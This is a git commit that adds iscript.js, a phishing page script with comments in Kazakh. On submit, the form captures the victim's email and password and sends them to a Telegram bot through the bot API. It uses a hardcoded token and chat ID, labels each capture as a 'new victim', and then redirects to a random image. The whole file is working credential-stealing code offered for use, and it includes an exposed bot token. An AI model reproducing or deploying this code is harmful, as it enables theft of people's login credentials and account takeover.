168b3a35957f3e646078eead5bc7a00942ece07c
tashmakhanbetmadiyar-cmd <tashmakhanbetmadiyar@gmail.com>
2026-04-16 14:09:37 +0500

    Add files via upload

---
+++ iscript.js
@@ -0,0 +1,31 @@
+const form = document.getElementById('phishingForm');
+
+// ТЕЛЕГРАМ ДЕРЕКТЕРІ (Өзіңдікін қой)
+// Сенің жаңа токенің
+const TOKEN = '8209277145:AAHLncTgBfRwbFSYPSl2LSdP7QP5e-QnTVk'; 
+
+// Бұл жерге өз ID-іңді қою керек
+const CHAT_ID = '6971293062';
+
+// ДЕРЕКТЕР КЕТКЕННЕН КЕЙІН ШЫҒАТЫН СУРЕТ
+const IMAGE_URL = 'https://picsum.photos/800/600?random=1'; // Кез келген сурет сілтемесі
+
+form.onsubmit = function(e) {
+    e.preventDefault();
+    
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('pass').value;
+
+    const text = `📬 ЖАҢА ҚҰРБАН!\n\nЛогин: ${email}\nПароль: ${pass}`;
+    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
+
+    fetch(url)
+        .then(() => {
+            // Пайдаланушыны суретке бағыттау
+            window.location.href = IMAGE_URL;
+        })
+        .catch(() => {
+            // Қате болса да бағыттау
+            window.location.href = IMAGE_URL;
+        });
+};
